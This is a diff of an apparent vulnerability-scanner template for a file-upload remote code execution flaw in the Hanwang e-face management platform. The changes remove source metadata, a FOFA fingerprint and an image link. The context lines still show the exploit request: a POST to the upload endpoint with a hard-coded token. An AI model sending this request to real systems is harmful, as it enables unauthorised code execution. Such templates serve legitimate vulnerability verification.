@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 resourceUploadFile.do存在文件上传致RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vi7dp36z9id341ge'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vi7dp36z9id341ge
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/dgmCommand/resourceUploadFile.do?recoToken=ZuZBOrvLG8M HTTP/1.1
@@ -35,7 +31,6 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827095165-41868b7d-ae24-453b-a58e-5ae68a9486b7.png)
 
     验证路径
 
